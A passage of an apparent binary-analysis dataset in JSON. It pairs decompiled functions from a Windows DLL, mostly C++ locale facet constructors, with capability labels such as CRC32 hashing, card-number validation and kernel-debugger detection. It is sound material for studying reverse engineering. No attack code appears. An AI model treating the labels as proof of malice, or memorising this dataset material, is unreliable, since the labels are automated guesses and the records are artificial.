            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800752c0(ulong noname_0, ulong arg2, ulong arg3)\n\n{\n    if (*0x1801287c0 != 0) {\n        (**0x1800de8f0)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0001800752f0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de4d8)(noname_0, arg3 & 1, arg3 & 2, arg2);\n    return;\n}\n",
        "token_count": 128
    },
    "18007928": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079280(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    code **ppcVar5;\n    uint *puVar6;\n    int64_t arg2_00;\n    bool bVar7;\n    uchar auStack160 [48];\n    uchar auStack112 [104];\n    \n    bVar7 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar5 = fcn.18008fb2c(0x40);\n        if (ppcVar5 == NULL) {\n            ppcVar5 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar7 = true;\n            *(ppcVar5 + 1) = 0;\n            *ppcVar5 = vtable.std::codecvt_unsigned_short_int__char__struct__Mbstatet_.0;\n            puVar6 = fcn.180074580(auStack160);\n            uVar2 = puVar6[1];\n            uVar3 = puVar6[2];\n            uVar4 = puVar6[3];\n            *(ppcVar5 + 2) = *puVar6;\n            *(ppcVar5 + 0x14) = uVar2;\n            *(ppcVar5 + 3) = uVar3;\n            *(ppcVar5 + 0x1c) = uVar4;\n            uVar2 = puVar6[5];\n            uVar3 = puVar6[6];\n            uVar4 = puVar6[7];\n            *(ppcVar5 + 4) = puVar6[4];\n            *(ppcVar5 + 0x24) = uVar2;\n            *(ppcVar5 + 5) = uVar3;\n            *(ppcVar5 + 0x2c) = uVar4;\n            ppcVar5[6] = *(puVar6 + 8);\n            *(ppcVar5 + 7) = puVar6[10];\n        }\n        *arg1 = ppcVar5;\n        if (bVar7) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 2;\n}\n",
        "token_count": 605
    },
    "18007937": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.180079374(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    bool bVar5;\n    bool bVar6;\n    code **ppcVar7;\n    ulong *arg2_00;\n    uint *puVar8;\n    int64_t arg1_00;\n    uchar auStack232 [32];\n    uint uStack200;\n    ulong uStack192;\n    code **appcStack184 [2];\n    uchar auStack168 [104];\n    int64_t aiStack64 [3];\n    uint64_t uStack40;\n    uint64_t uStack32;\n    \n    uStack192 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack232;\n    bVar6 = false;\n    bVar5 = false;\n    uStack200 = 0;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar7 = fcn.18008fb2c(0x20);\n        appcStack184[0] = ppcVar7;\n        if (ppcVar7 == NULL) {\n            ppcVar7 = NULL;\n        }\n        else {\n            arg2_00 = fcn.180002500(arg2, aiStack64);\n            uStack200 = 1;\n            if (0xf < arg2_00[3]) {\n                arg2_00 = *arg2_00;\n            }\n            fcn.180002370(auStack168, arg2_00);\n            bVar6 = true;\n            bVar5 = true;\n            *(ppcVar7 + 1) = 0;\n            *ppcVar7 = vtable.std::collate_unsigned_short_int_.0;\n            puVar8 = fcn.18007436c(appcStack184);\n            uVar2 = puVar8[1];\n            uVar3 = puVar8[2];\n            uVar4 = puVar8[3];\n            *(ppcVar7 + 2) = *puVar8;\n            *(ppcVar7 + 0x14) = uVar2;\n            *(ppcVar7 + 3) = uVar3;\n            *(ppcVar7 + 0x1c) = uVar4;\n        }\n        *arg1 = ppcVar7;\n        if (bVar5) {\n            fcn.1800023f0(auStack168);\n        }\n        if ((bVar6) && (0xf < uStack40)) {\n            arg1_00 = aiStack64[0];\n            if (0xfff < uStack40 + 1) {\n                arg1_00 = *(aiStack64[0] + -8);\n                if (0x1f < (aiStack64[0] - arg1_00) - 8U) {\n                    fcn.1800b3528(arg1_00, uStack40 + 0x28);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(arg1_00);\n        }\n    }\n    fcn.18008fb00(uStack32 ^ auStack232);\n    return;\n}\n",
        "token_count": 718
    },
    "1800794b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.1800794b4(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    code **ppcVar5;\n    uint *puVar6;\n    int64_t arg2_00;\n    bool bVar7;\n    uchar auStack192 [32];\n    uchar auStack160 [48];\n    uchar auStack112 [104];\n    \n    bVar7 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar5 = fcn.18008fb2c(0x60);\n        if (ppcVar5 == NULL) {\n            ppcVar5 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar7 = true;\n            *(ppcVar5 + 1) = 0;\n            *ppcVar5 = vtable.std::ctype_unsigned_short_int_.0;\n            puVar6 = fcn.18007417c(auStack192);\n            uVar2 = puVar6[1];\n            uVar3 = puVar6[2];\n            uVar4 = puVar6[3];\n            *(ppcVar5 + 2) = *puVar6;\n            *(ppcVar5 + 0x14) = uVar2;\n            *(ppcVar5 + 3) = uVar3;\n            *(ppcVar5 + 0x1c) = uVar4;\n            uVar2 = puVar6[5];\n            uVar3 = puVar6[6];\n            uVar4 = puVar6[7];\n            *(ppcVar5 + 4) = puVar6[4];\n            *(ppcVar5 + 0x24) = uVar2;\n            *(ppcVar5 + 5) = uVar3;\n            *(ppcVar5 + 0x2c) = uVar4;\n            puVar6 = fcn.180074580(auStack160);\n            uVar2 = puVar6[1];\n            uVar3 = puVar6[2];\n            uVar4 = puVar6[3];\n            *(ppcVar5 + 6) = *puVar6;\n            *(ppcVar5 + 0x34) = uVar2;\n            *(ppcVar5 + 7) = uVar3;\n            *(ppcVar5 + 0x3c) = uVar4;\n            uVar2 = puVar6[5];\n            uVar3 = puVar6[6];\n            uVar4 = puVar6[7];\n            *(ppcVar5 + 8) = puVar6[4];\n            *(ppcVar5 + 0x44) = uVar2;\n            *(ppcVar5 + 9) = uVar3;\n            *(ppcVar5 + 0x4c) = uVar4;\n            ppcVar5[10] = *(puVar6 + 8);\n            *(ppcVar5 + 0xb) = puVar6[10];\n        }\n        *arg1 = ppcVar5;\n        if (bVar7) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 2;\n}\n",
        "token_count": 823
    },
    "1800795c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.1800795c4(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = vtable.std::messages_unsigned_short_int_.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 6;\n}\n",
        "token_count": 316
    },
    "18007968": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079688(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = vtable.std::messages_wchar_t_.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 6;\n}\n",
        "token_count": 314
    },
    "18007974": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18007974c(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::money_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n            ;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 340
    },
    "18007981": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079810(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::money_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 337
    },
    "1800798d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.1800798d4(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::money_put_unsigned_short_int__class_std::ostreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n            ;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 341
    },
    "18007999": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079998(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::money_put_wchar_t__class_std::ostreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 337
    },
    "180079a5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079a5c(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **arg1_00;\n    int64_t arg2_00;\n    bool bVar2;\n    uchar auStack128 [104];\n    \n    bVar2 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x78);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack128, arg2_00);\n            bVar2 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = vtable.std::_Mpunct_unsigned_short_int_.0;\n            *(arg1_00 + 0x44) = 1;\n            fcn.18007f204(arg1_00);\n            *arg1_00 = vtable.std::moneypunct_unsigned_short_int__1_.0;\n        }\n        *arg1 = arg1_00;\n        if (bVar2) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 369
    },
    "180079b3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079b3c(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **arg1_00;\n    int64_t arg2_00;\n    bool bVar2;\n    uchar auStack128 [104];\n    \n    bVar2 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x78);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack128, arg2_00);\n            bVar2 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = vtable.std::_Mpunct_unsigned_short_int_.0;\n            *(arg1_00 + 0x44) = 0;\n            fcn.18007f204(arg1_00);\n            *arg1_00 = vtable.std::moneypunct_unsigned_short_int__0_.0;\n        }\n        *arg1 = arg1_00;\n        if (bVar2) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 369
    },
    "180079c1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079c1c(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **arg1_00;\n    int64_t arg2_00;\n    bool bVar2;\n    uchar auStack128 [104];\n    \n    bVar2 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x78);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack128, arg2_00);\n            bVar2 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = vtable.std::_Mpunct_wchar_t_.0;\n            *(arg1_00 + 0x44) = 1;\n            fcn.18007f39c(arg1_00);\n            *arg1_00 = vtable.std::moneypunct_wchar_t__1_.0;\n        }\n        *arg1 = arg1_00;\n        if (bVar2) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 370
    },
    "180079cf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079cfc(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **arg1_00;\n    int64_t arg2_00;\n    bool bVar2;\n    uchar auStack128 [104];\n    \n    bVar2 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x78);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack128, arg2_00);\n            bVar2 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = vtable.std::_Mpunct_wchar_t_.0;\n            *(arg1_00 + 0x44) = 0;\n            fcn.18007f39c(arg1_00);\n            *arg1_00 = vtable.std::moneypunct_wchar_t__0_.0;\n        }\n        *arg1 = arg1_00;\n        if (bVar2) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 3;\n}\n",
        "token_count": 369
    },
    "180079dd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079ddc(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::num_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n            ;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 4;\n}\n",
        "token_count": 340
    },
    "180079ea": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079ea0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::num_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 4;\n}\n",
        "token_count": 338
    },
    "180079f6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180079f64(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::num_put_unsigned_short_int__class_std::ostreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n            ;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 4;\n}\n",
        "token_count": 340
    },
    "18007a02": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18007a028(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = \n            vtable.std::num_put_wchar_t__class_std::ostreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 4;\n}\n",
        "token_count": 338
    },
    "18007a0e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18007a0ec(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **arg1_00;\n    int64_t arg2_00;\n    bool bVar2;\n    uchar auStack128 [104];\n    \n    bVar2 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x30);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack128, arg2_00);\n            bVar2 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = vtable.std::numpunct_unsigned_short_int_.0;\n            fcn.18007f534(arg1_00);\n        }\n        *arg1 = arg1_00;\n        if (bVar2) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 4;\n}\n",
        "token_count": 331
    },
    "18007a1c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18007a1c0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **arg1_00;\n    int64_t arg2_00;\n    bool bVar2;\n    uchar auStack128 [104];\n    \n    bVar2 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x30);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack128, arg2_00);\n            bVar2 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = vtable.std::numpunct_wchar_t_.0;\n            fcn.18007f714(arg1_00);\n        }\n        *arg1 = arg1_00;\n        if (bVar2) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 4;\n}\n",
        "token_count": 332
    },
    "18007a29": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18007a294(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    code **arg1_00;\n    ulong arg3;\n    code **arg1_01;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack128 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x58);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            arg3 = fcn.180002370(auStack128, arg2_00);\n            bVar3 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = \n            vtable.std::time_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n            ;\n            arg1_00[2] = NULL;\n            arg1_00[3] = NULL;\n            arg1_00[4] = NULL;\n            arg1_01 = arg1_00;\n            fcn.180075be4(arg1_00, 0, arg3);\n            uVar2 = fcn.18008fa9c(arg1_01);\n            *(arg1_00 + 5) = uVar2;\n        }\n        *arg1 = arg1_00;\n        if (bVar3) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 5;\n}\n",
        "token_count": 458
    },
    "18007a38": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18007a384(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    code **arg1_00;\n    ulong arg3;\n    code **arg1_01;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack128 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x58);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            arg3 = fcn.180002370(auStack128, arg2_00);\n            bVar3 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = \n            vtable.std::time_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0;\n            arg1_00[2] = NULL;\n            arg1_00[3] = NULL;\n            arg1_00[4] = NULL;\n      